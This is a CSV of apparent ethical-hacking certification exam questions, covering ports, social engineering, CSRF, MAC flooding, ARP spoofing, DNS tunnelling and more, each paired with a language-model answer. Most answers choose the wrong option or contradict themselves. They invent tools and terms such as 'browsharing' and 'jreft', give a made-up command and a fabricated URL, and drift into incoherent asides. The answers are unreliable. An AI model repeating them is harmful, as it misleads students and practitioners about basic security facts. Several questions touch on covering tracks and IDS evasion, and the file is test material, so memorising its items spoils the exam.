index,question,llm_answer
118,"Elante company has recently hired James as a penetration tester. He was tasked with performing enumeration
on an organization's network. In the process of enumeration, James discovered a service that is accessible to
external sources. This service runs directly on port 21. What is the service enumerated byjames in the above
scenario?
A.  Border Gateway Protocol (BGP)
B.  File Transfer Protocol (FTP)
C.  Network File System (NFS)
D.  Remote procedure call (RPC)
","
the correct answer is d. the remote procedure call ( rpc ) protocol is used for multiple functions. one of them, with ports hidden, is used to enumerate on remote systems. another function is to serve file services ( such as ftp or http ). among other things, the rpc protocol allows two systems to share procedures, which means that a built-in procedure implemented in both systems. this is accomplished with the remote procedure call command rpcbind. according to the rcd file, located in /usr/sbin/ on most linux systems, this procedure works by passing an argument to an already implemented service on the local system. to summarize it all, the remote procedure call protocol uses rpcbind and rpcserver to pull a remote procedure. file transfer protocol, on the other hand, means a variety of things. in windows systems, it ’ s used for transferring files. in linux, it refers back to a series of procedures that, for the most part, are handled by the running procedure file transfer protocol. finally, the border gateway protocol is used to reach a router. from there, you might be able to reach systems on the internal network. except for file transfer, which is relatively easy to identify, these are very difficult categories to answer this question in. one last thing to keep in mind is that each procedure, when it is pulling across procedures on both sides, creates a link between a running procedure on both sides that allows data transfer. in other words, each side runs the same procedure,"
119,"An unauthorized individual enters a building following an employee through the employee entrance after the
lunch rush. What type of breach has the individual just performed?
A.  Reverse Social Engineering
B.  Tailgating
C.  Piggybacking
D.  Announced
","
the correct answer is b. tailgating is referring to the practice of one person following another ’ s steps while they wait to get through a queue or to get through a line. it ’ s a bad analogy because you aren ’ t following someone ’ s steps any longer than you need to. you may follow someone just to grab something they have because you want it, but that ’ s not the reason for following someone. the reason for tailgating is exactly what it sounds like—following another person along the way of getting to where you want to go. it ’ s a bad term because you don ’ t “ tailgate ” someone any longer than you need to. you may tailgate someone just to get something you want, but that ’ s not the reason for tailgating. the other person may just walk ahead of you or not talk to you at all. there is also talk to go along with someone and then not talk to them or ignore them. you are announcing something, whether it ’ s a badge or some other identifier, and someone else is not looking at what you have or isn ’ t paying attention to you. there is also talk to go along with someone and then follow them. you are talking to someone and then following their steps. the difference between announcing and follow-to-follow is follow-to-follow is a long-way-from-home situation where someone is following someone else all the way to the exit. reverse social engineering is a little bit confusing because “"
120,"By performing a penetration test, you gained access under a user account. During the test, you established a
connection with your own machine via the SMB service and occasionally entered your login and password in
plaintext.
Which file do you have to clean to clear the password?
A.  .X session-log
B.  .bashrc
C.  .profile
D.  .bash_history
","
the correct answer is d. the.bashrc file holds all the settings for the bash shell. without more help, you ’ ll probably need to start over. the file would need to be cleared in order to start fresh. the other three are unrelated to the shell. smb is the server message block protocol, used to communicate with systems on a network. occasionally ( not sure what the term is ) is used, and a plaintext login and password can be caught. the term login itself is ambiguous and can refer to a number of things. as a basic rule, any login trying to use plaintext passwords or session logs. as a fun aside, the term itself is sometimes referred to as session maintenance. depending on the source, it may be used to fix issues with sessions, where a little session data is kept and used repeatedly. generally, the sessions themselves are kept in memory at all times and not stored on the local machine each time the session changes. as a side note, you probably won ’ t really see the actual password during a normal test. it would be unexpected, and you ’ d be suspicious of someone using plaintext passwords. however, if you see it, it ’ s likely something malicious because it relatively easy to generate it. the point is most passwords won ’ t be seen during a normal test. authentication is being able to authenticate with a password that is right. a nice little snippet from macos ’ password policy is this : no passwords will be stored on system memory,"
121,"Websites and web portals that provide web services commonly use the Simple Object Access Protocol
(SOAP).
Which of the following is an incorrect definition or characteristics of the protocol?
A.  Exchanges data between web services
B.  Only compatible with the application protocol HTTP
C.  Provides a structured model for messaging
D.  Based on XML
","
the correct answer is a. soap is a protocol that makes use of databonds to exchange information between applications. it implements the portable object format ( port ), which is a way of packaging data in a object-oriented language for transmission between applications. other object request brokers ( bor ) may also transmit on behalf of you. they would not be considered part of the web of things because the bor is transmited over a network. soap is also known for transmitting in xml. but not all implementers of soap will translate it to http since that would be confusing to people. also, it ’ s not structured like http because that would make them identical. finally, soap doesn ’ t exist at the portal level. portals don ’ t transmit as responses from a web service. a web service may, though, transmit through soap. an http transfer is transmited on a network anywhere. a portable object format transmission is transmited in xml. soap is a way of translating information between applications. it doesn ’ t exist at the portal level. portals don ’ t transmit responses from a web service. http transfers are transmitted on a network anywhere. a port is a translation of an object request broker ( bor ). bor transfers on behalf of an application. soap is a way of translating information between applications. it doesn ’ t exist at the portal level. portals don ’ t transmit responses from a web service. http doesn ’ t translate into soap. soap doesn ’ t exist at the"
122,"Attacker Simon targeted the communication network of an organization and disabled the security controls of
NetNTLMvl by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and
RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active
processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by
Simon?
A.  Internal monologue attack
B.  Combinator attack
C.  Rainbow table attack
D.  Dictionary attack
","
the correct answer is d. an internal monologue ( im ) attack occurs when an attacker uses the status bar on a computer to talk to the operating system. nothing physical is used to do this ; the computer itself does the rendering. as such, the attack is occurring at the level of the operating system rather than the level of the application. in other words, it ’ s like stealing a book by pretending to be interested in statistics. or, for moronity lovers, it ’ s like hanging up a phone directory of men in your area by pretending to be in a woman. up and outside attacks of this type are no longer possible because window implementation in ntos2 ( known as kernel version 2 ) prevents any attack of this type ( really any attack, come to think of it—just ask what kind of attack you ’ re talking about ). however, the old school used to include in their attack statements, sometimes on page 1 of a book, a method to a mimick a real attack by simply using some common pass- words like password and password2. these old-school attack statements include details on using simmon ’ s method to extract all active login tokens ( urls ; a url holds all the information regarding a specific active login session ) and simon ’ s method to do it—getting all the names of them all ( simsong also includes a method to do this by using the “ suspect ” status of some passwords, making it appear that the following"
123,"Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without
the recipient?s consent, similar to email spamming?
A.  Bluesmacking
B.  BlueSniffing
C.  Bluejacking
D.  Bluesnarfing
","
the correct answer is a. bluesmacking is someone trying to bluetoots a bluetooth device by sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesmacking. bluesniffing is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesniffing. bluesjacking is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesjacking. bluesnarfing is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesnarfing. the difference between bluesmacking and bluesniffing is which end is being attacked. bluesmacking is being attacked on the end of a bluetooth port in the server. bluesniffing is being attacked on the end of a bluetooth port in the client. as an ethical hacker, we should protect both ends as much as we can. blowing their minds and exposing their vulnerabilities to the outside world should be our goal. bluesmacking is using bluesmacking.net to send payloads to a bluetooth port on a server. bluesniffing is using bluesniff.net to send payloads to a bluetooth port on a client. both www.bluesmacking.net and www.bluesniff.net should be checked for vulnerabilities. after exploiting bluesmacking and bluesniffing, you ’ ll have access to information like password files, links, and other vulnerable assets"
124,"A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much
information can be obtained from the firm?s public facing web servers. The engineer decides to start by using
netcat to port 80.
The engineer receives this output:
HTTP/1.1 200 OK
Server: Microsoft-IIS/6
Expires: Tue, 17 Jan 2011 01:41:33 GMT
Date: Mon, 16 Jan 2011 01:41:33 GMT
Content-Type: text/html
Accept-Ranges: bytes
Last Modified: Wed, 28 Dec 2010 15:32:21 GMT
ETag:?b0aac0542e25c31:89d?
Content-Length: 7369
Which of the following is an example of what the engineer performed?
A.  Banner grabbing
B.  SQL injection
C.  Whois database query
D.  Cross-site scripting
","
the correct answer is b. nothing is guaranteed with netcat, including the ability to run any current or new running program you want. in this example, netcat is using a bunch of hidden parameters to attempt a dns query. it ’ s entirely possible netcat is going to fail, because it ’ s not guaranteed to succeed. of the choices provided, though, banner grabbing is the only one that makes any sense. browsharing ( banner grabbing ) is using a current browser to grab information on an open ports from a remote server. it should now begin returning useful information. as an aside, the following command will find and output banner data : browshering -c -d www.domain.com -p 80 after you ’ ll need to make sure there is a lot of traffic. as an additional little note, banner grabbing with netcat is similar to grabbing passwords using zbra. the same will be true for sql injection and cross-site scripting. the way through this is to use a tool that ’ s going to do exactly what you want, and there are few better than netcat. as a fun aside, browsharing won ’ t work for what you want because what you ’ d really want to do is access sites, which requires a web browser. with netcat, you are going to be setting up a listener, which means running something that will do your work for you. one last note on banner grabbing and netcat to keep in mind is that you ’"
125,"Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows
systems?
A.  getsystem
B.  getuid
C.  keylogrecorder
D.  autoroute
","
the correct answer is b. let ’ s get this out of the way up front : you won ’ t need to use metasploit for keylogging operations. there are keyloggers you can use on windows systems without even getting away from the clipboard ( and even then, it ’ s not the whole clipboard ). metasploit has a lot of modules that could be used for almost anything you might want, but keylogging isn ’ t one of them. getsystem pulls the system down to a system behind a url and runs a copy of ssh. port monitoring is also common throughout metasploit, and an entire session on the malware engine can be used to pull that entire thing together. keyloggers themselves aren ’ t particularly common, but there are some options for you. one of them is to use an instance permanently attached to a url. this was started by lockbox ( url locker ) and eventually persisted as google drive, google docs, or online storage on an external device. the latest versions of lockbox ( from metasploit ) offer the chance to have the drive moved to a background process that will keep checking to see if you want to get something from it. you can still do that with a portable lockbox ( downloaded file ) from 4x4 security. keyratemaker is another feature of lockbox, and metasploit has a number of ways to place a permanently attached port to a url. one of the more reliable ( not"
126,"What type of a vulnerability/attack is it when the malicious person forces the user?s browser to send an
authenticated request to a server?
A.  Session hijacking
B.  Server side request forgery
C.  Cross-site request forgery
D.  Cross-site scripting
","
the correct answer is c. cross-site request forgery is an attack that uses a form to take users back to a site, possibly by referencing references in their cookies. since many users automatically submit those forms by clicking them, the user can be manipulated into executing malicious code. these attacks can be lessened or prevented by using cookies only to maintain a single session and using out-of-band messaging. both server-side request forgery and cross-site request forgery are less descriptive than cross-site scripting, which defines what cross-site is all about. cross-site scripting attacks usually involve some form of injection, and all attack efforts can be scripted. another key point to note here is that the attack is never really “ session hijacking. ” whatever the compromised site is doing, the user is already attached. most of those attacks can be mitigated or prevented by using cookies to maintain a single session and avoiding unused port numbers. server-side request forgery is a longer-term perspective and is a much deeper attack. a hacker could potentially use a lot of information from the user ’ s browsing history, cookies, and other information to target specific individuals. one method to pull that off may be to turn the browser ’ s search and recommendation pages to the hacker ’ s choice. in addition to knowing a lot about cookie management and how to exploit it, the hacker may also use something like jreft ( journal reliable firewall ), which can detect any cookie vulnerability and take steps to fix it. as an aside,"
127,"Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a
signature-based IDS?
A.  Produces less false positives
B.  Can identify unknown attacks
C.  Requires vendor updates for a new threat
D.  Cannot deal with encrypted network traffic
","
the correct answer is d. anomaly-based ids is being set up on a subset of packets and is required on all packets for the scan to succeed. a signature-based ids is being set up on all packets, while an anomaly-based ids is being set up on some and not on others. a requires vendor updates for a new threat. a, d., since these are all “ new ” threats, they may be new and not have been seen before. d. is a reasonable answer. an anomaly-based ids system will look at the data and not just the attributes themselves. since there is no definition of what “ new ” means, this is a question of reliability. a signature-based ids system knows exactly what brownlee has been identified as a threat in the past and, as a result, can ’ t add new threats. d. is the most reliable answer. if a vendor provides no updates, the symptom is they ’ re not going to detect anything. as a side note, the real question here is what company provides the software. the point is these things are decided by the needs of the platform and not on whether a threat is known before. that raises another question about security—how do you know there ’ s a problem to begin with? it ’ s a relative thing, depending on how your defined a success. if it ’ s not defined at all, it ’ s probably a failure. is 100 kbps considered a success or a threat? how about 500"
128,"Bill has been hired as a penetration tester and cyber security auditor for a major credit card company. Which
information security standard is most applicable to his role?
A.  FISMA
B.  HITECH
C.  PCI-DSS
D.  Sarbanes-OxleyAct
","
the correct answer is b. i ’ m going to take a risk here and ask a somewhat risky question, but it ’ s necessary to make this lesson meaningful. bill is an experienced pen test attacker who wants a steady flow of rewards for his efforts. he ’ s put up a private box in microsoft ’ s virtual box on openvas and installed gnu diffie-hellman ( gd-hellman ) to generate and key the private key for auditing purposes. but bill wants more than just security credentials. he wants a free lunch. the sarbanes-oxley act forces every public company to put up a board-approved annual budget and income tax agreement at the start of every fiscal year. bill wants the peace of mind that goes along with having a carefully approved, digitally signed document explaining his scope of work. how does this relate to ec-council exams? first, most people think that the same rules of logic apply in the testing as well as real world scenarios. therefore, if bill really wants freedom from responsibility ( rather than being responsible for free ), he should be able to get a simple pass. second, sarbanes-oxley act required taxpayers to make the tax agreement based on a professional judgment. instead of relying on one year ’ s outdated and possibly inaccurate income tax laws, their tax agreements are based on research and analysis of various tax laws, guidelines, and rules. ec-council has no such law, but people trying to earn a pass can take the"
129,"When conducting a penetration test, it is crucial to use all means to get all available information about the
target network. One of the ways to do that is by sniffing the network. Which of the following cannot be
performed by the passive network sniffing?
A.  Identifying operating systems, services, protocols and devices
B.  Modifying and replaying captured network traffic
C.  Collecting unencrypted information about usernames and passwords
D.  Capturing a network traffic for further analysis
","
the correct answer is b. can ’ t be done by passive network sniffing. both symmetric and asymmetric keys can be used to encrypt data. while passive network sniffing can be used to gather information about a target network, and probably almost without exception can be done by analyzing the traffic, it can definitely be done by manipulating and replaying captured network traffic. all of the other answers are related in some way to sniffing, but couldn ’ t be done by passive network sniffing. symmetric and asymmetric keys can be used to encrypt data, but there is still network traffic that can be used to identify an address or network segment. identifying operating systems, services, protocols and devices can be done by active network scanning. passing traffic can be used to gather information about the target network, including usernames and passwords. however, doing it by manipulating and replaying captured network traffic can be very tedious. the idea itself is pretty straightforward : instead of thinking about applications and traffic as source and destination, think about them as owned and broadcast. imagining this makes it much easier to pull source and broadcast traffic. a great resource for helping with this is called sink spending. if you have a source device and can tell the difference between local and broadcast traffic, sink spending means looking at traffic to see how much source traffic can be found. a sink is just a network device that can hold traffic for a long time without doing anything, thus the name sink. spending means investigating a specific address and looking at all the traffic"
130,"Dayn, an attacker, wanted to detect if any honeypots are installed in a target network. For this purpose, he used
a time-based TCP fingerprinting method to validate the response to a normal computer and the response of a
honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect
honeypots?
A.  Detecting honeypots running on VMware
B.  Detecting the presence of Honeyd honeypots
C.  Detecting the presence of Snort_inline honeypots
D.  Detecting the presence of Sebek-based honeypots
","
the correct answer is b. tcp fingerprinting is a function that allows a hacker to identify if any fingerprint exists on a system by using the time-based tcp fingerprinting method. one example of this is where a human detects if any honeypot is using a honeypot. a time-based tcp fingerprinting module on a linux system will check to see if any named tcp fingerprints exist on a system. each named tcp fingerprint exists a certain time, and if it ’ s past a certain time, the module will check if any tcp fingerprint of a particular type exists on a system. an nbt fingerprinting module does almost the same thing : it checks to see if any named tcp fingerprints exist on a system by using the netbios name ( bn ) function. a bn fingerprinting module works in the same way as its named tcp fingerprinting module, except it checks bn as a means of identifying the source. snort_inline is another name for a sniffing tcp fingerprinting module. it does exactly what it sounds like—it identifies if any snort_inline named tcp fingerprint exists on a system. sebek is an id-based detection module that checks to see if any named tcp fingerprint of a certain type exists on a system. in addition to the ones listed here, there are other tcp fingerprinting modules and tools you can use : • tcp-fingerprint - checks to see if any named tcp fingerprints exist on a system. • namedtcpf - checks to see if any named tcp fingerprints exist on"
131,"Kate dropped her phone and subsequently encountered an issue with the phone's internal speaker. Thus, she is
using the phone's loudspeaker for phone calls and other activities. Bob, an attacker, takes advantage of this
vulnerability and secretly exploits the hardware of Kate's phone so that he can monitor the loudspeaker's
output from data sources such as voice assistants, multimedia messages, and audio files by using a malicious
app to breach speech privacy. What is the type of attack Bob performed on Kate in the above scenario?
A.  Man-in-the-disk attack
B.  aLTEr attack
C.  SIM card attack
D.  Spearphone attack
","
the correct answer is d. phone calls from a smartphone are relatively secure, although at all times you should watch for situations where privacy may be possible. one example is the iphone ’ s built-in phone blocker, which can prevent the usage of the phone speaker or loudspeaker function on an iPhone. speech privacy in this scenario would indicate something more personal—maybe even a stolen physical thing. the loudspeaker is a hardware feature of the phone, so it would be related to a physical aspect of the device. this type of theft is mostly physical in nature, but in this case it ’ s almost totally physical. the speaker is part of the phone hardware, so it would be classified as a sim card. the similarity between a sim card and a bluetooth device is often compared to the similarity between a phone and a pen. the sim card is placed inside a phone, so they both travel in the same body. in this attack, the speaker is a physical component of the phone, so it would be classified as such. speech privacy on a smartphone is controlled mainly by the software used for transmitting and receiving calls. external speakers, themselves, are not part of the phone system and don ’ t affect it in any way. therefore, this attack would not be classified as a man-in-the-disk ( mitd ) attack. man-in-the-disk attacks are used to extract sensitive data from a mobile device in order to expose or corrupt it. in other words, the mitd attack is exposing the"
132,"Cross-site request forgery involves:
A.  A request sent by a malicious user from a browser to a server
B.  Modification of a request by a proxy between client and server
C.  A browser making a request to a server without the user?s knowledge
D.  A server making a request to another server without the user?s knowledge
","
the correct answer is d. cross-site request forgery involves an attack on users to pass data back and forth between a client and a server. a malicious user on the client, or even an attacker on the server, could run a cross-site request forgery ( xsf ) and take advantage of the trust between the client and the server. a user on the client sends a request to the server, possibly by clicking a link in the website. while on the client, the user maybe logged in or trusted by the site, so whatever is sending the request may not recognize the difference between the user and a hacker posing as a user. the request may be passed to the server, possibly by using json, xml, or other data serialization. if the request is passed, and that request is allowed by the server, then something is going somewhere it shouldn ’ t. this can be used for session hijacking, authentication leakage, or other attacks. the attacker might also run a cross-site request forgery on the server to gain access to some data. note that a hacker would need rights on the server to be able to run a forgery on both sides ; it ’ s not good if you want to just ignore something on one side and not the other. also, a hacked site and hacked server would be useless. maybe better would be a hacked browser. that says someone could potentially use a third-party browser to visit a website and still get a request forged on the behind-the-browser environment."
133,"Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet
switch?
A.  Evil twin attack
B.  DNS cache flooding
C.  MAC flooding
D.  DDoS attack
","
the correct answer is d. a dns cache poisoning attack works by using a target address or hostname to request a dns resolution. instead of obtaining the real address from the cache, the dns will return an ip from its cache. this can be used as a beginning point for attacking sites. mac flooding uses the mac address of a target to request a dns resolution. then, using something like the ping sweep tool, you ’ ll discover every machine on the target network begins on the same mac address. since dns will return the source of the requested mac address, you ’ ll know where to go next. to really pull off this attack, you ’ ll need a zombie machine. an zombie machine can be anything from a zombie operating system to a facebook, twitter, or other social networking account. the idea is to have the zombie do whatever we want it to. as an aside, a hybrid attack uses both dns and mac flooding. the dns will do its thing, and the mac will flood the switch. then, the attacker will watch to see what comes next. with the next step, the attacker will monitor the traffic between the switch and a mac address site. when we add the whole packet aspect to this, the timing will be even more snicked along the way. as an aside, a syn flood is also a dns and mac attack. the key difference to remember here is that a dns cache flooding attack is a cam table overflow attack. mac flooding is similarly simple, just find the mac"
134,"How can rainbow tables be defeated?
A.  Use of non-dictionary words
B.  All uppercase character passwords
C.  Password salting
D.  Lockout accounts under brute force password cracking attempts
","
the correct answer is d. password salting is putting additional information into the power and key used to crack the passwords. unlike dictionaries, which are word lists, password salting uses a process called encryption to make it more difficult for crackers to unlock passwords. there is still some upper limitation on how many attempts are made per password member per unit time, but it ’ s very lower on the attempt count. one way to say password salting is adding random data to the power and key used to crack the passwords. there are two ways to say this on exam question questions—one being “ password salting. ” one way to say it on the real world is using multiple methods to crack the passwords. there are many ways to say lockout accounts under brute force password cracking attempts, but most documents say password salting. a couple of ways to say password salting on your exam question are using lockout accounts under brute force password cracking attempts and password salting. none of the other documents say any things, but all of them say lockout accounts under brute force password cracking attempts. lockout accounts are used when a large number of user attempts to a system causes a lockout message. there is no way to say password salting using lockout accounts under brute force password cracking attempts. the second way to say password salting on your exam question is using password creation formulas to crack passwords. there are several ways to say this on the real world, and the short of it is using multiple"
135,"Miley, a professional hacker, decided to attack a target organization's network. To perform the attack, she used
a tool to send fake ARP messages over the target network to link her MAC address with the target system's IP
address. By performing this, Miley received messages directed to the victim's MAC address and further used
the tool to intercept, steal, modify, and block sensitive communication to the target system. What is the tool
employed by Miley to perform the above attack?
A.  Gobbler
B.  KDerpNSpoof
C.  BetterCAP
D.  Wireshark
","
the correct answer is c. arp spoofing is a valuable means to gain useful information from a hacked system. by receiving the fake arp message to the target system, miley can receive and use the target ’ s local arp cache. this means miley not only sees the traffic being sent to the fake address but also receives the traffic between the system and network. this also allows miley to modify, steal, modify, and block traffic to and from the target system. other tools she could employ with arp spoofing include arpspoof, arpsnap, and hping. for your exam, we’re not really focusing on how the tool works ; we ’ re concerned with its application—alarming you that it ’ s there—and how to employ it. see example 1 of the handout : while the rest of the chapter discusses methods and tools for arp spoofing, the following example uses the bettercap ( www.bettercap.com/ ) tool. try out this great open-source project by accessing the website or downloading it. bettercap makes use of kderpnspoof and bettersnarf, and also adds some enhanced features with bloodshed software. epoxa ( www.epoxa.net/ ) is another option. as an aside, in you will find some claims that arp spoofing is a useless section due to its complexity and low success rate ; however, the rest of the chapter is dedicated to learning how to employ it, so i ’ d"
136,"The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the
network the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124. An attacker is
trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap
192.168.1.64/28.
Why he cannot see the servers?
A.  He needs to add the command ??ip address?? just before the IP address
B.  He needs to change the address to 192.168.1.0 with the same mask
C.  He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
D.  The network must be dawn and the nmap command and IP address are ok
","
the correct answer is c. when the network address is 192.168.1.64 and the mask is 255.255.255.192, only the last bit can be hidden. all other bits can be seen. if the network is dawn and the distance is only 28, then the longest street in london is seeable. in this case 192.168.1.122, 192.168.1.123 and 192.168.1.124 can be seen because they are all on the same street. in no way does a network address change that would require a address scan to see what servers are on the other street. the address 192.168.1.122 is just as hidden as the address 192.168.1.123 or 192.168.1.124. the address 192.168.1.64 can not be seen because the distance is 28. the network must be dawn and the length of the street in london is 64. an nmap command has no effect on that. what the attacker is trying to find is a way to scan all streets in one address range, and the address 192.168.1.64 is the only one that gives this possibility. this is a example of tool usage and network naming in nmap. you should remember the three keys to a successful scan—confidence in the tools themselves and in what they can see, as well as confidence in the"
137,"Ben purchased a new smartphone and received some updates on it through the OTA method. He received two
messages: one with a PIN from the network operator and another asking him to enter the PIN received from
the operator. As soon as he entered the PIN, the smartphone started functioning in an abnormal manner. What
is the type of attack performed on Ben in the above scenario?
A.  Advanced SMS phishing
B.  Bypass SSL pinning
C.  Phishing
D.  Tap 'n ghost attack
","
the correct answer is c. this is another fun, common attack line. the user receives an update from the operator, making a change to the software or releases data from the server. ben probably entered a pin provided by the operator, just as if he were playing a game with a fake url or some fake data. instead of looking at the websites or making a consideration that a website is faulty based on a phishing attempt, he decides to do something for the operator. this is a tap 'n ghost attack, usually referring to an iphone user who somehow maintains track of time on the device and copies the typical status update from the operator the next day. there is really no verification of anything, for any actual attack like this, in the real world. needless to say, tap 'n ghost attacks can be legitimate in the outside world, but being a phishing attack, it ’ s still phishing. security doesn ’ t really need to be any different from the ground up on this topic. the point is that some people just can ’ t resist phishing, whether it ’ s real or fake, in fact, or on a specific type ; all of these cases fall under tap 'n ghost. the point is that phishing is still phishing, no matter what you ’ re throwing at it. as for the particular attack line here, don ’ t forget that in many cases an attacker may simply be looking to confirm a status or change a setting, whether from the end of the user or from"
138,"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called
which of the following?
A.  Compound SQLi
B.  Blind SQLi
C.  Classic SQLi
D.  DMS-specific SQLi
","
the correct answer is a. injection attacks are accomplished using sql because they allow an attacker to query the data base and perform a selection based on the response. if the database is on a system different from the web server, the attack won ’ t work. these are specific attacks, not because classic and blind attacks are unknown, but because they ’ re specific to this exam. once you start injecting into a question on what type of sqli you ’ re talking, there ’ s about a 95 percent chance you ’ ll be right. this type of question is great because you ’ re learning, not because you ’ ll have to practice all the time. but don ’ t get it confused with classic being unique and blind being common. classic is a reference to a method of injecting an attack into a whole scenario, whereas blind is how you ’ d catch an attack without ever actually executing it. therefore, when you are in the midst of an injection attack, use the method that applies. if it ’ s classic, just use the method that ’ s clear to you. you ’ ll be fine. most of the time. but the point is, stay disciplined with these questions. remember the three ways of a sqli attack : injection, bind, command, and then remember that the best method to pull it off in the first place is to know exactly what a sqli is capable of doing. when you get to questions like this, just remember classic = first, best, and when"
139,"You have compromised a server and successfully gained a root access. You want to pivot and pass traffic
undetected over the network and evade any possible Intrusion Detection System. What is the best approach?
A.  Use Alternate Data Streams to hide the outgoing packets from this server.
B.  Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems.
C.  Install Cryptcat and encrypt outgoing packets from this server.
D.  Install and use Telnet to encrypt all outgoing traffic from this server.
","
the correct answer is c. a common idss ( risk management system ) will likely check your ip address and probably ask you where you are targeting. they may add any note notes in their system that your activity is suspicious and possibly an intrusion attempt. likely as that, the intrusion detection systems will probably ignore your traffic. the last two options give you the chance to send traffic hidden inside a file, e-mail, or other communication channel. http is being blocked or disrupted at many organizations now day to day, for several reasons, but primarily with regard to encryption. http is the correct answer here because all traffic can be routed via a browser ( due to compatibility issues with other transport protocols ). telnet is a horrible idea here and should be considered such from the start. the following is from url www.exploit-db.com/warehouses/exploit-db/manufacturers/auta/html/9278/1/index.html : “ sending http traffic with a telnet session can result in a denial-of-service for the server you are targeting. telnet is a great start when attempting to gain access to new systems, but it ’ s a horrible idea now. ” assuming you can get the code removed or cached in the first place ( and you should be able to get it removed or cached until you ’ re satisfied with the results of any testing you choose to engage ), you should be able to send traffic hidden inside a file, e-mail, or other communication channel. try use will definitely"
140,"John, a professional hacker, decided to use DNS to perform data exfiltration on a target network, in this
process, he embedded malicious data into the DNS protocol packets that even DNSSEC cannot detect. Using
this technique. John successfully injected malware to bypass a firewall and maintained communication with
the victim machine and C&C server. What is the technique employed by John to bypass the firewall?
A.  DNS cache snooping
B.  DNSSEC zone walking
C.  DNS tunneling method
D.  DNS enumeration
","
the correct answer is c. dns tunneling is a function that can be used to hide a submission port so it can get away unobserved. the “ hiding ” is accomplished by using dns to point legitimate traffic to a spoofed ip address. the spoofed ip address is put on the local network where the real target is. thinking about which network device will accomplish this is the key to understanding how it is done. once dns knows the spoofed ip and starts issuing traffic for that address, the targeting device ( such as a mac monitor or another tool such as se toolkit ) can watch the traffic just as the target can be watched. there are several reasons why this works, including a simple principle called “ description doesn ’ t matter ”. what that means simply has to do is a web server that can render anything you want, provided it ’ s on a zone that is allowed by dns. this can be as a tool, like cgi, or even a dynamic html site that can be passed all kinds of content you want. a few notes on using dns tunneling should be made here. of course, being the wise guy that you are, you ’ ll recognize this technique can be used for malicious inno-centic as well as goodie-payoff. defeating dns tunneling will not only provide a method to pull nasty mal-ware onto your system, but you ’ ll also be able to track back who sent the malicious code. a simple method to do this is to"
141,"Which iOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after
each successive reboot?
A.  Tethered jailbreaking
B.  Semi-tethered jailbreaking
C.  Untethered jailbreaking
D.  Semi-Untethered jailbreaking
","
the correct answer is b. tethered jailbreaking requires an external power source in the form of a charger or another device that is plugged into the device. the user then relies on the charger to provide power to the device, which would allow the jailbreaking to happen. the charger may limit or patch the kernel during the boot process to ensure the jailbreaking does not cause any damage to the device. semi-tethered jailbreaking allows the user to maintain connectivity to the device after the first round of locks after the jailbreaking is complete. however, plugging into the device after the first round of locks may provide a way for the attacker to access the device after the first round of locks is rolled up by the charger. tethered jailbreaking is a much less common occurrence than semi-tethered and untethered jailbreaking. semi-tethered jailbreaking allows the user to connect to the device after the first round of locks is rolled up by the charger, but only after a pre-defined period of time has passed. for example, half an hour may be expected to reconnect after jailbreaking is complete. untethered jailbreaking involves the user ignoring the charger and connecting directly from the first round of locks to the device after the charger has turned off. this gives the user direct access to the device after the first round of locks is rolled up by the charger. both semi- and untethered jailbreaking should provide the user with the ability to connect to the device after the first round"
